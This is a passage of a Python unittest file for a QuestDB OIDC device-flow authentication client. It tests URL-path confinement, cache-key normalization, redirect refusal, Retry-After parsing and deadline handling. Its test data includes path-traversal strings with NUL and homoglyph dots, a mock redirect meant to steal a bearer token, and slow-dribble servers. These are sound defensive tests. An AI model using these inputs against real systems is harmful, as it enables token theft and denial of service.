        self.assertTrue(under(iss + '/some%20path/token', iss))
        self.assertTrue(under(iss + '/token;jsessionid=abc', iss))
        # A NUL (or any other C0 control / DEL) in a segment is rejected (m7):
        # it survives _strip_matrix_params (str.strip trims only whitespace
        # controls), so "..%00" decodes to '..\x00' (not literally '..') and
        # would slip the dot-check — but a NUL-truncating or control-stripping
        # proxy/server resolves it back to '..' and reaches a different realm.
        self.assertFalse(under(iss + '/..%00/EVIL/token', iss))      # ..NUL
        self.assertFalse(under(iss + '/%2e%2e%00/EVIL/token', iss))  # enc ..NUL
        self.assertFalse(under(iss + '/..%01/EVIL/token', iss))      # ..C0
        self.assertFalse(under(iss + '/..%7f/EVIL/token', iss))      # ..DEL
        # A printable-ASCII segment with an internal space (%20) is still fine.
        self.assertTrue(under(iss + '/ok%20name/token', iss))
        # A non-ASCII homoglyph dot segment is rejected too: a fullwidth U+FF0E
        # '．．' (literal, its %-encoded UTF-8, or the ideographic U+3002) is not
        # literally '..' here, yet a server that NFKC-normalizes the path before
        # dot-segment removal could fold it to a real '..' and reach a different
        # realm. Legitimate credential-endpoint paths are plain ASCII (chr() keeps
        # the confusables out of the test source).
        fw_dot = chr(0xff0e) * 2                       # fullwidth '．．'
        self.assertFalse(under(iss + '/' + fw_dot + '/EVIL/token', iss))
        self.assertFalse(under(iss + '/%ef%bc%8e%ef%bc%8e/EVIL/token', iss))
        self.assertFalse(                              # ideographic full stop
            under(iss + '/' + chr(0x3002) * 2 + '/EVIL/token', iss))


class TestCacheKey(unittest.TestCase):
    def _auth(self, **kw):
        opts = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            scope='openid groups', groups_in_token=True,
            renderer=Renderer())
        opts.update(kw)
        return OidcDeviceAuth(**opts)

    def test_normalize_url_malformed_port_raises_config_error(self):
        # cache_key normalization shares the same typed-port guard: a malformed
        # port raises OidcConfigError, not a bare ValueError. See M6.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://idp:notaport/token')

    def test_normalize_url_malformed_ipv6_raises_config_error(self):
        # cache_key normalization must also map a malformed IPv6 literal (which
        # makes urlparse itself raise) to OidcConfigError, not a bare
        # ValueError. See M1.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://[::1')

    def test_normalize_url_rebrackets_ipv6_to_match_store_key(self):
        # _normalize_url (the in-memory cache_key) must re-add the brackets
        # urllib strips off an IPv6 literal, exactly as the on-disk
        # _canonical_endpoint does. Without them "[::1]:9000" (host ::1, port
        # 9000) and the DISTINCT host "[::1:9000]" (default port) both collapse to
        # the ambiguous "::1:9000" and key two different IPv6 endpoints to ONE
        # in-memory cache entry — while the bracketing disk store keeps them apart
        # — i.e. a token keyed one way in memory and another on disk, the exact
        # divergence this normalization exists to prevent.
        from questdb.auth._device import _normalize_url
        from questdb.auth._store import _canonical_endpoint
        a = 'https://[::1]:9000/token'
        b = 'https://[::1:9000]/token'
        # Distinct in memory now (they previously collided) ...
        self.assertNotEqual(_normalize_url(a), _normalize_url(b))
        # ... making the SAME distinction the on-disk key already made.
        self.assertNotEqual(_canonical_endpoint(a), _canonical_endpoint(b))
        # Brackets preserved so the host:port boundary stays unambiguous.
        self.assertEqual(_normalize_url(a), 'https://[::1]:9000/token')
        self.assertEqual(
            _normalize_url('http://[::1]/token'), 'http://[::1]/token')

    def test_realm_path_distinguishes_key(self):
        # Multi-tenant IdP: same host, different realm path -> distinct keys
        # (the old origin-only key collided, leaking one realm's token).
        a = self._auth(
            token_endpoint='https://idp.example.com/realmA/token',
            device_authorization_endpoint='https://idp.example.com/realmA/dev')
        b = self._auth(
            token_endpoint='https://idp.example.com/realmB/token',
            device_authorization_endpoint='https://idp.example.com/realmB/dev')
        self.assertNotEqual(a.cache_key, b.cache_key)

    def test_scope_order_does_not_change_key(self):
        self.assertEqual(
            self._auth(scope='openid groups').cache_key,
            self._auth(scope='groups openid').cache_key)

    def test_audience_distinguishes_key(self):
        self.assertNotEqual(
            self._auth(audience='aud-1').cache_key,
            self._auth(audience='aud-2').cache_key)

    def test_default_port_normalized(self):
        self.assertEqual(
            self._auth(token_endpoint='https://idp.example.com/token').cache_key,
            self._auth(
                token_endpoint='https://idp.example.com:443/token').cache_key)

    def test_issuer_trailing_slash_and_case_do_not_change_key(self):
        # A discovered issuer often carries a trailing slash ("https://idp/")
        # while an explicit one does not ("https://idp"); case and a default :443
        # likewise vary. None of these change the security context, so they must
        # not split the cache key and force an avoidable re-prompt.
        base = self._auth(issuer='https://idp.example.com')
        for variant in ('https://idp.example.com/',
                        'https://IDP.example.com',
                        'https://idp.example.com:443',
                        'https://idp.example.com:443/'):
            self.assertEqual(base.cache_key,
                             self._auth(issuer=variant).cache_key, variant)

    def test_token_endpoint_trailing_slash_does_not_change_key(self):
        # m2: like the issuer, the token endpoint is trailing-slash-normalized in
        # the cache key. A discovered "https://idp/token/" and an explicit
        # "https://idp/token" are the same endpoint, so they must not split the
        # key and force an avoidable re-prompt. (A different realm PATH still
        # stays distinct -- see test_realm_path_distinguishes_key.)
        base = self._auth(token_endpoint='https://idp.example.com/token')
        slashed = self._auth(token_endpoint='https://idp.example.com/token/')
        self.assertEqual(base.cache_key, slashed.cache_key)

    def test_issuer_realm_path_distinguishes_key(self):
        # A different realm PATH on the same host is a different issuer and must
        # stay a distinct key — origin-only normalization would wrongly collide
        # them.
        self.assertNotEqual(
            self._auth(
                issuer='https://idp.example.com/realms/prod').cache_key,
            self._auth(
                issuer='https://idp.example.com/realms/staging').cache_key)

    def test_store_key_isolates_issuer_by_fingerprint_not_hash(self):
        # M1: two sessions differing ONLY by issuer pin. The in-memory cache_key
        # distinguishes them, and so does the on-disk identity -- but via the
        # in-file issuer fingerprint, NOT the file-name hash (a frozen
        # cross-language contract kept byte-stable). So they address the SAME
        # file yet carry distinct issuer fingerprints and never adopt each
        # other's token. The issuer is normalized identically on both sides
        # (_normalize_url), so memory and disk agree on the issuer axis.
        store = FileTokenStore.at(tempfile.mkdtemp())
        a = self._auth(
            issuer='https://idp.example.com/realms/a', token_store=store)
        b = self._auth(
            issuer='https://idp.example.com/realms/b', token_store=store)
        self.assertNotEqual(a.cache_key, b.cache_key)               # memory: distinct
        self.assertEqual(a._store_key.hash(), b._store_key.hash())  # same file name
        self.assertNotEqual(                                        # distinct identity
            a._store_key.issuer, b._store_key.issuer)
        # Issuer spelling that doesn't change the security context (trailing
        # slash / case / default port) must NOT split the on-disk identity
        # either, exactly as it doesn't split cache_key.
        c = self._auth(issuer='https://IDP.example.com/realms/a/', token_store=store)
        self.assertEqual(a._store_key.issuer, c._store_key.issuer)

    def test_groups_in_token_distinguishes_key(self):
        # groups_in_token selects which token kind _select returns, so two
        # sessions differing ONLY in that mode must not collide on one cache
        # entry (and evict each other). scope already has 'openid' here, so the
        # keys can differ only by the mode.
        self.assertNotEqual(
            self._auth(groups_in_token=True).cache_key,
            self._auth(groups_in_token=False).cache_key)

    def test_in_memory_and_on_disk_keys_agree_on_identity(self):
        # Regression for M2: the in-memory cache_key and the on-disk
        # TokenStoreKey.hash() must make the SAME identity distinctions, or a
        # token cached under one key in memory could be served from a different
        # one on disk (a wrong-identity serve), or a single identity could split
        # across two store files (a needless re-prompt after restart). Check the
        # three axes that used to diverge.
        store = FileTokenStore.at(tempfile.mkdtemp())

        def keys(scope='openid', token_ep='https://idp.example.com/token'):
            a = OidcDeviceAuth(
                client_id='c', token_endpoint=token_ep,
                device_authorization_endpoint='https://idp.example.com/device',
                scope=scope, token_store=store)
            return a.cache_key, a._store_key.hash()

        # (b) scope ORDER — the same identity on BOTH sides.
        (ck1, sk1) = keys(scope='openid groups')
        (ck2, sk2) = keys(scope='groups openid')
        self.assertEqual(ck1, ck2)
        self.assertEqual(sk1, sk2)
        # (c) trailing SLASH — the same identity on BOTH sides.
        (ck3, sk3) = keys(token_ep='https://idp.example.com/token')
        (ck4, sk4) = keys(token_ep='https://idp.example.com/token/')
        self.assertEqual(ck3, ck4)
        self.assertEqual(sk3, sk4)
        # (a) token-endpoint QUERY — a DIFFERENT identity on BOTH sides, so two
        # query-distinguished tenants never collide onto one store file (which
        # would serve one tenant's token to the other).
        (ck5, sk5) = keys(token_ep='https://idp.example.com/token?tenant=a')
        (ck6, sk6) = keys(token_ep='https://idp.example.com/token?tenant=b')
        self.assertNotEqual(ck5, ck6)
        self.assertNotEqual(sk5, sk6)
        # (d) trailing SLASH *and* a query together (regression for M1): the old
        # cache_key rstrip('/')-ed the whole rendered URL, so the slash hidden
        # before the query survived in memory ('…/token/?t' stayed split from
        # '…/token?t') while the store stripped it on the path and kept them one
        # — the two keys disagreed. They must agree: same identity on BOTH sides.
        (ck7, sk7) = keys(token_ep='https://idp.example.com/token?tenant=a')
        (ck8, sk8) = keys(token_ep='https://idp.example.com/token/?tenant=a')
        self.assertEqual(ck7, ck8)
        self.assertEqual(sk7, sk8)
        # (e) a slash that is part of a query VALUE must NOT be stripped (the old
        # whole-string rstrip could chop it), so two distinct query values stay a
        # different identity on BOTH sides.
        (ck9, sk9) = keys(token_ep='https://idp.example.com/token?redirect=a/')
        (ck10, sk10) = keys(token_ep='https://idp.example.com/token?redirect=a')
        self.assertNotEqual(ck9, ck10)
        self.assertNotEqual(sk9, sk10)


class TestTransportSecurity(unittest.TestCase):
    def test_require_secure_policy(self):
        from questdb.auth._http import _require_secure
        # https is always fine.
        _require_secure('https://idp.example.com/x', insecure=False)
        # loopback http never leaves the host -> always allowed.
        _require_secure('http://127.0.0.1:9000/x', insecure=False)
        _require_secure('http://localhost/x', insecure=False)
        _require_secure('http://[::1]:8080/x', insecure=False)
        # non-loopback http is refused unless insecure is explicitly set.
        with self.assertRaises(OidcConfigError):
            _require_secure('http://idp.example.com/x', insecure=False)
        _require_secure('http://idp.example.com/x', insecure=True)

    def test_post_form_attaches_status_to_non_json_error(self):
        # The device-flow poll loop and the silent refresh classify a non-JSON
        # token-endpoint failure (4xx terminal vs 5xx/429 transient) by the HTTP
        # status, so post_form must attach it to the raised OidcError. M1/M2.
        from questdb.auth._http import post_form
        with _raw_response_server(403, 'text/plain', b'forbidden') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 403)
        # A non-JSON 5xx likewise carries its status (classified as transient).
        with _raw_response_server(503, 'text/html', b'<h1>bad gw</h1>') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 503)

    def test_post_form_attaches_retry_after_to_non_json_error(self):
        # m2: a non-JSON 429/503 carrying a Retry-After header surfaces that value
        # on the raised OidcError (mirroring the JSON path's _PostResult), so a
        # poll backs off by the server's value rather than the fixed +5s step.
        from questdb.auth._http import post_form
        with _raw_response_server(429, 'text/plain', b'slow down',
                                  {'Retry-After': '30'}) as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 429)
        self.assertEqual(cm.exception.retry_after, 30)

    def test_parse_retry_after_rejects_lenient_int_forms(self):
        # m7: int() is looser than the RFC 7231 delta-seconds it parses — it also
        # accepts a leading sign ('+0010'), PEP 515 underscore separators ('1_0'),
        # and non-ASCII Unicode decimal digits (e.g. Arabic-Indic '٠', mapped to
        # 0). Only a bare run of ASCII digits is a valid Retry-After; anything else
        # must read as absent (None) so the poll falls back to its fixed back-off
        # rather than honor a malformed / attacker-crafted value.
        from questdb.auth._http import _parse_retry_after
        # Accepted: plain / zero-padded ASCII digits, surrounding whitespace,
        # zero, and a case-insensitive (HTTP/2- or proxy-lowercased) header name.
        self.assertEqual(_parse_retry_after({'Retry-After': '30'}), 30)
        self.assertEqual(_parse_retry_after({'Retry-After': '0010'}), 10)
        self.assertEqual(_parse_retry_after({'Retry-After': '  5  '}), 5)
        self.assertEqual(_parse_retry_after({'Retry-After': '0'}), 0)
        self.assertEqual(_parse_retry_after({'retry-after': '7'}), 7)
        # Rejected (all -> None): sign, underscores, Unicode digits, superscript,
        # decimal / exponent, words, and the empty / whitespace-only value.
        for bad in ('+0010', '-5', '1_0', '٠١', '²',
                    '10.0', '1e3', 'soon', '', '   '):
            self.assertIsNone(_parse_retry_after({'Retry-After': bad}), bad)
        # No matching header, an empty mapping, and None headers all read absent.
        self.assertIsNone(_parse_retry_after({'X-Other': '9'}))
        self.assertIsNone(_parse_retry_after({}))
        self.assertIsNone(_parse_retry_after(None))
        # Length is bounded before int(): on Python >= 3.10.7 int() RAISES
        # ValueError on a string longer than sys.get_int_max_str_digits()
        # (default 4300 digits). This runs inside post_form before its own
        # try/except, so an unbounded int() would leak a raw ValueError past the
        # module's typed-error contract when a hostile IdP / on-path proxy sends a
        # giant Retry-After. A >9-digit value (>31 years, meaningless) reads as
        # absent; a 9-digit one is still accepted. Must return None, never raise.
        self.assertEqual(
            _parse_retry_after({'Retry-After': '9' * 9}), 999999999)
        self.assertIsNone(_parse_retry_after({'Retry-After': '9' * 10}))
        self.assertIsNone(_parse_retry_after({'Retry-After': '9' * 5000}))

    def test_incomplete_error_body_maps_to_network_error(self):
        # A 4xx/5xx with a truncated CHUNKED body (the server announces a chunk,
        # sends fewer bytes, then closes) makes the error-body read raise
        # http.client.IncompleteRead — an HTTPException, NOT an OSError. The poll
        # loop drives many 4xx during sign-in, so this must map to a typed
        # OidcNetworkError, not escape raw (mirrors the success path's handler).
        # See M3.
        import http.client
        from questdb.auth import _http
        self.assertFalse(issubclass(http.client.IncompleteRead, OSError))

        class _ChunkedTrunc(http.server.BaseHTTPRequestHandler):
            protocol_version = 'HTTP/1.1'  # chunked transfer needs HTTP/1.1

            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(400)
                self.send_header('Transfer-Encoding', 'chunked')
                self.end_headers()
                self.wfile.write(b'64\r\n')   # announce a 0x64 = 100-byte chunk
                self.wfile.write(b'short')     # send only 5 of them, then close
                self.wfile.flush()
                self.close_connection = True

        srv = http.server.HTTPServer(('127.0.0.1', 0), _ChunkedTrunc)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            with self.assertRaises(OidcNetworkError):
                _http.request(
                    'GET', f'http://127.0.0.1:{srv.server_port}/x', timeout=5)
        finally:
            srv.shutdown()
            srv.server_close()

    def test_insecure_does_not_downgrade_idp(self):
        # insecure=True must NOT permit plaintext to a non-loopback IdP: the
        # device code / refresh token must never traverse the network in clear.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://idp.example.com/device',
            token_endpoint='http://idp.example.com/token',
            scope='openid', groups_in_token=False,
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        with self.assertRaises(OidcConfigError):
            auth.token()

    def test_redirects_are_not_followed(self):
        # A 30x must NOT be followed: urllib would otherwise re-send the
        # Authorization: Bearer header (and downgrade to plaintext http) to the
        # redirect target, leaking the QuestDB token off-origin (only the
        # original URL is vetted, never the redirect target). The redirect must
        # surface as a non-2xx response, and the off-origin host must never be
        # contacted. See C1.
        from questdb.auth import _http

        seen = []

        class _Redir(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                seen.append((self.path, self.headers.get('Authorization')))
                if self.path == '/exec':
                    self.send_response(302)
                    self.send_header('Location', attacker + '/stolen')
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header('Content-Length', '2')
                    self.end_headers()
                    self.wfile.write(b'{}')

        victim = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        thief = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        attacker = f'http://127.0.0.1:{thief.server_port}'
        for srv in (victim, thief):
            threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            resp = _http.request(
                'GET', f'http://127.0.0.1:{victim.server_port}/exec',
                headers={'Authorization': 'Bearer SECRET'}, timeout=5)
        finally:
            for srv in (victim, thief):
                srv.shutdown()
                srv.server_close()

        # The redirect surfaced as a non-2xx response, was not followed, and the
        # off-origin target never saw the request (or the bearer token).
        self.assertEqual(resp.status, 302)
        self.assertEqual(seen, [('/exec', 'Bearer SECRET')])

    def test_https_opener_refuses_redirects(self):
        # Issue 9: the production path carries the bearer / refresh token over
        # HTTPS (ctx is a real SSLContext); the end-to-end redirect test above
        # exercises only the plain-HTTP (ctx=None) opener. Pin that _NoRedirect is
        # wired into the HTTPS opener too — and that it REPLACES the default
        # HTTPRedirectHandler (so a 30x is actually refused, not just shadowed).
        import ssl
        import urllib.request
        from questdb.auth import _http
        opener = _http._opener(ssl.create_default_context())
        redirect_handlers = [
            h for h in opener.handlers
            if isinstance(h, urllib.request.HTTPRedirectHandler)]
        self.assertEqual(len(redirect_handlers), 1,
                         'expected exactly one redirect handler in the opener')
        self.assertIsInstance(
            redirect_handlers[0], _http._NoRedirect,
            '_NoRedirect missing from the HTTPS opener — a 30x could re-send the '
            'bearer/refresh token cross-origin')

    def test_parse_retry_after(self):
        # Issue 8: Retry-After delta-seconds parsed (case-insensitive); the
        # HTTP-date form and junk return None (caller falls back to its +5s step).
        from questdb.auth._http import _parse_retry_after
        self.assertEqual(_parse_retry_after({'Retry-After': '30'}), 30)
        self.assertEqual(_parse_retry_after({'retry-after': ' 45 '}), 45)
        self.assertEqual(_parse_retry_after({'Retry-After': '0'}), 0)
        for bad in ({'Retry-After': 'Wed, 21 Oct 2015 07:28:00 GMT'},
                    {'Retry-After': '-5'}, {'Retry-After': 'soon'},
                    {'X-Other': '5'}, {}, None):
            self.assertIsNone(_parse_retry_after(bad))

    def test_backoff_interval(self):
        # Issue 8: honor Retry-After (clamped to [5, 60]); else the RFC 8628 +5s.
        from questdb.auth._device import (
            _backoff_interval, _MIN_POLL_INTERVAL, _MAX_POLL_INTERVAL)
        self.assertEqual(_backoff_interval(5, None), 10)       # +5s step
        self.assertEqual(_backoff_interval(20, None), 25)
        self.assertEqual(_backoff_interval(5, 30), 30)         # honored
        self.assertEqual(_backoff_interval(5, 120), _MAX_POLL_INTERVAL)  # capped
        self.assertEqual(_backoff_interval(5, 1), _MIN_POLL_INTERVAL)    # floored

    def test_post_result_is_2tuple_with_retry_after(self):
        # Issue 8: _PostResult is a 2-tuple (existing `status, body = ...` callers
        # are unaffected) that also carries .retry_after.
        from questdb.auth._http import _PostResult
        r = _PostResult(429, {'error': 'slow_down'}, 30)
        status, body = r
        self.assertEqual((status, body), (429, {'error': 'slow_down'}))
        self.assertEqual(r, (429, {'error': 'slow_down'}))   # equals plain tuple
        self.assertEqual(r.retry_after, 30)
        self.assertIsNone(_PostResult(200, {}, None).retry_after)

    def test_malformed_url_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not a raw
        # http.client.InvalidURL escaping the typed-error contract — this is the
        # path the QuestDB /settings / discovery fetches go through. See M3.
        from questdb.auth._http import request
        with self.assertRaises(OidcConfigError):
            request('GET', 'https://questdb.example.com:notaport/settings',
                    timeout=5)

    def test_unencodable_request_maps_to_config_error(self):
        # M1/M2: a lone surrogate in a form field (a JSON string a hostile IdP
        # can return as a device_code / refresh_token / scope — it passes the
        # isinstance(str) coercion guards) makes urlencode().encode('utf-8')
        # raise; a non-ASCII URL host makes http.client's encode raise. Both must
        # surface as a typed OidcConfigError, not a raw UnicodeEncodeError
        # escaping the contract (the encode/Request now run inside request()'s
        # try). Neither reaches the network, so no server is needed.
        from questdb.auth._http import request
        with self.assertRaises(OidcConfigError):   # surrogate in the form body
            request('POST', 'https://idp.example/token',
                    form={'device_code': '\ud800'}, timeout=5)
        with self.assertRaises(OidcConfigError):   # non-ASCII host (backstop path)
            request('GET', 'https://bаd.example/settings', timeout=5)

    def test_require_secure_rejects_malformed_ipv6(self):
        # _require_secure routes through safe_urlparse, so a malformed IPv6
        # endpoint raises OidcConfigError instead of a bare ValueError (urlparse
        # raises before the scheme is even inspected). See M1.
        from questdb.auth._http import _require_secure
        with self.assertRaises(OidcConfigError):
            _require_secure('https://[::1', insecure=False)
        # A well-formed IPv6 URL is still accepted (loopback http is allowed).
        _require_secure('http://[::1]:8080/x', insecure=False)

    def test_read_body_accepts_normal_body(self):
        from questdb.auth._http import _read_body
        resp = _ChunkStream(b'hello ', b'world')
        self.assertEqual(
            _read_body(resp, max_bytes=1000, deadline=1e18), b'hello world')

    def test_read_body_rejects_oversized(self):
        # A body over the cap raises instead of buffering unbounded into memory.
        from questdb.auth._http import _read_body
        resp = _ChunkStream(b'x' * 60, b'y' * 60)   # 120 bytes > 100-byte cap
        with self.assertRaises(OidcNetworkError):
            _read_body(resp, max_bytes=100, deadline=1e18)

    def test_read_body_rejects_truncated_content_length(self):
        # Regression: read1() (which _read_body reads through, for the chunked-
        # dribble watchdog) does NOT enforce Content-Length — on a body that
        # DECLARES N bytes but delivers fewer then EOFs, it returns the short data
        # then a clean b'', with no exception. Without the guard, that truncated
        # (yet still JSON-parseable) body was handed back as a complete 200. Since
        # http.client leaves the still-owed count on resp.length, _read_body must
        # treat a truthy length at EOF as a truncation and raise.
        from questdb.auth._http import _read_body

        class _LenResp:
            # Faithfully mimics http.client.HTTPResponse on a Content-Length body:
            # read1(n) yields up to n buffered bytes and DECREMENTS the owed
            # count, so .length hits 0 exactly when the declared body is fully
            # delivered and stays > 0 if the peer closed early.
            def __init__(self, body, declared):
                self._body = body
                self.length = declared

            def read1(self, n):
                if not self._body:
                    return b''
                chunk, self._body = self._body[:n], self._body[n:]
                self.length -= len(chunk)
                return chunk

        truncated = _LenResp(b'{"access_token":"REAL"}', declared=5000)
        with self.assertRaises(OidcNetworkError):
            _read_body(truncated, max_bytes=10 ** 6, deadline=1e18)

        # A body that delivers exactly its declared length drains .length to 0 and
        # must still be accepted — the guard must not over-reject.
        body = b'{"access_token":"REAL"}'
        complete = _LenResp(body, declared=len(body))
        self.assertEqual(
            _read_body(complete, max_bytes=10 ** 6, deadline=1e18), body)

        # A chunked body has no declared length (no `length` attribute, so
        # getattr -> None), so the guard must NOT fire — the deadline watchdog
        # bounds that path instead.
        chunked = _ChunkStream(b'{"a":', b'1}')
        self.assertEqual(
            _read_body(chunked, max_bytes=10 ** 6, deadline=1e18), b'{"a":1}')

    def test_request_rejects_truncated_content_length_body(self):
        # Regression against the REAL socket stack (the _LenResp unit test above
        # cannot catch a mismatch with real http.client behaviour). A server that
        # DECLARES a large Content-Length but sends a short, valid-JSON body then
        # closes must NOT be handed back as a complete 200 — request() must raise
        # OidcNetworkError rather than let a hostile/flaky peer pass off a
        # truncated token / config response as whole.
        import socket
        from questdb.auth import _http

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        port = srv.getsockname()[1]

        def serve():
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            try:
                conn.recv(65536)  # consume the request line/headers
                # Declare 5000 bytes, send a ~40-byte valid-JSON body, then close
                # — a clean early EOF (not a dribble), well inside the deadline.
                conn.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: application/json\r\n'
                    b'Content-Length: 5000\r\n\r\n'
                    b'{"access_token":"REAL","refresh_token":"R"}')
            finally:
                conn.close()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()
        try:
            with self.assertRaises(OidcNetworkError):
                _http.request('GET', f'http://127.0.0.1:{port}/x', timeout=5.0)
        finally:
            srv.close()
            server_thread.join(2.0)

    def test_read_body_aborts_on_slow_dribble(self):
        # A steady dribble that never trips the per-read socket timeout must
        # still abort once the whole-read wall-clock deadline passes — the gap
        # urllib's per-operation timeout leaves open.
        from questdb.auth import _http
        body = _ChunkStream(*([b'a'] * 10000))       # endless trickle
        ticks = iter([0.0, 0.2, 0.4, 2.0])           # advance past deadline=1.0
        with mock.patch.object(_http, '_monotonic',
                               lambda: next(ticks, 100.0)):
            with self.assertRaises(OidcNetworkError):
                _http._read_body(body, max_bytes=10 ** 9, deadline=1.0)

    def test_read_body_aborts_real_socket_dribble(self):
        # Regression for M1, against the REAL socket stack (the _ChunkStream
        # unit test above cannot catch this — the mock defines read() itself).
        # A real http.client response's read(n) blocks until n bytes are
        # buffered, so a server dribbling one byte per socket-timeout window
        # would keep a single read(_READ_CHUNK) blocked forever and the
        # wall-clock deadline (checked only between reads) would never fire.
        # _read_body must read via read1() so each read returns after one
        # socket read and the deadline is honored; this would hang the calling
        # thread (which holds the acquisition lock) before the fix.
        import socket
        from questdb.auth import _http

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        stop = threading.Event()

        def serve():
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            try:
                conn.recv(65536)  # consume the request line/headers
                # Announce a large body, then dribble it one byte at a time,
                # each well inside the per-socket timeout window so urllib's
                # per-read timeout never fires.
                conn.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: application/json\r\n'
                    b'Content-Length: 1000000\r\n\r\n')
                while not stop.is_set():
                    try:
                        conn.sendall(b'a')
                    except OSError:
                        break
                    stop.wait(0.1)
            finally:
                conn.close()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()

        result = {}

        def call():
            try:
                _http.request(
                    'GET', f'http://127.0.0.1:{port}/x', timeout=1.0)
                result['returned'] = True
            except Exception as e:  # noqa: BLE001 - record for the assert below
                result['error'] = e

        t = threading.Thread(target=call, daemon=True)
        t.start()
        t.join(8.0)
        hung = t.is_alive()            # capture before cleanup unblocks it
        stop.set()
        srv.close()
        server_thread.join(2.0)

        self.assertFalse(
            hung,
            'request() hung on a dribbling server: the whole-read wall-clock '
            'deadline never fired (M1 regression — _read_body must read via '
            'read1()).')
        self.assertIsInstance(result.get('error'), OidcNetworkError)

    def test_read_body_aborts_real_socket_chunked_dribble(self):
        # Regression for C1, against the REAL socket stack. read1() returns after
        # one socket read on a Content-Length body (the test above), but on a
        # CHUNKED body it calls http.client's readline() to parse each chunk-size
        # line, and readline() loops over socket reads until it sees a newline.
        # A server that dribbles the size line one byte at a time, never
        # terminating it, keeps a single read1() blocked for up to _MAXLINE
        # (~hours) — the between-reads deadline never runs and the per-socket
        # timeout keeps resetting — hanging the calling thread (which holds the
        # acquisition lock). _read_body's deadline watchdog must shut the socket
        # down at the deadline and surface a typed OidcNetworkError.
        import socket
        from questdb.auth import _http

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        stop = threading.Event()

        def serve():
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            try:
                conn.recv(65536)  # consume the request line/headers
                # Announce chunked, then dribble the chunk-SIZE line one hex
                # digit at a time with NO terminating CRLF, each well inside the
                # per-socket timeout window so urllib's per-read timeout never
                # fires.
                conn.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: application/json\r\n'
                    b'Transfer-Encoding: chunked\r\n\r\n')
                while not stop.is_set():
                    try:
                        conn.sendall(b'a')
                    except OSError:
                        break
                    stop.wait(0.1)
            finally:
                conn.close()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()

        result = {}

        def call():
            try:
                _http.request(
                    'GET', f'http://127.0.0.1:{port}/x', timeout=1.0)
                result['returned'] = True
            except Exception as e:  # noqa: BLE001 - record for the assert below
                result['error'] = e

        t = threading.Thread(target=call, daemon=True)
        t.start()
        t.join(8.0)
        hung = t.is_alive()            # capture before cleanup unblocks it
        stop.set()
        srv.close()
        server_thread.join(2.0)

        self.assertFalse(
            hung,
            'request() hung on a chunked size-line dribble: the deadline '
            'watchdog never fired (C1 regression).')
        self.assertIsInstance(result.get('error'), OidcNetworkError)

    def test_request_aborts_real_socket_head_dribble(self):
        # Regression for M1 (the HEAD read), against the REAL socket stack. The
        # body watchdog above is armed inside _read_body, which runs only after
        # open() returns; open() itself reads the status line + headers via
        # http.client begin(), whose _read_status()/readline() loops over socket
        # reads until it sees a newline. A server that dribbles the STATUS LINE
        # one byte at a time, never terminating it, keeps open() blocked for up to
        # _MAXLINE (~hours) — the per-socket timeout resets on each byte and the
        # body watchdog is not armed yet — hanging the calling thread (which holds
        # the acquisition lock). request()'s head watchdog must shut the socket
        # down at the deadline and surface a typed OidcNetworkError.
        import socket
        from questdb.auth import _http

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        stop = threading.Event()

        def serve():
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            try:
                conn.recv(65536)  # consume the request line/headers
                # Dribble the STATUS LINE one byte at a time, never sending its
                # terminating CRLF, each well inside the per-socket timeout window
                # so urllib's per-read timeout never fires and begin()'s
                # _read_status() stays blocked in readline().
                while not stop.is_set():
                    try:
                        conn.sendall(b'a')
                    except OSError:
                        break
                    stop.wait(0.1)
            finally:
                conn.close()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()

        result = {}

        def call():
            try:
                _http.request(
                    'GET', f'http://127.0.0.1:{port}/x', timeout=1.0)
                result['returned'] = True
            except Exception as e:  # noqa: BLE001 - record for the assert below
                result['error'] = e

        t = threading.Thread(target=call, daemon=True)
        t.start()
        t.join(8.0)
        hung = t.is_alive()            # capture before cleanup unblocks it
        stop.set()
        srv.close()
